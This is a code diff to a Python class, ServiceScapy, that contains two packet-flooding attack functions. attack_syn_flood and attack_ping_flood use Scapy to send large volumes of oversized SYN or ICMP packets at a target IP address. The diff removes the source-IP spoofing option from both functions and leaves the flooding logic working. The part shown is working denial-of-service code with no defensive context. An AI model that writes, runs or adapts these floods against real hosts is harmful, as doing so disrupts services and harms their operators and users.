@@ -62,11 +62,7 @@ class ServiceScapy:
     # A SYN flood attack is a common form of a denial of service attack in which an attacker sends a sequence of SYN requests to the target system
     # https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
     def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4, spoof_source_ip: bool = True) -> bool:
-        ip = None
-        if spoof_source_ip:
-            ip = IP(src=self.utils_random.get_random_ip(), dst=target_ip_address)
-        else:
-            ip = IP(dst=target_ip_address)
+        ip = IP(dst=target_ip_address)
         tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
         raw = Raw(b"X" * size_of_packet)
         p = ip / tcp / raw
@@ -75,11 +71,7 @@ class ServiceScapy:
         return True
 
     def attack_ping_flood(self, target_ip_address: str, number_of_packets_to_send: int = 3, size_of_packet: int = 65500, spoof_source_ip: bool = True) -> bool:
-        ip = None
-        if spoof_source_ip:
-            ip = IP(src=self.utils_random.get_random_ip(), dst=target_ip_address)
-        else:
-            ip = IP(dst=target_ip_address)
+        ip = IP(dst=target_ip_address)
         icmp = ICMP()
         raw = Raw(b"X" * size_of_packet)
         p = ip / icmp / raw
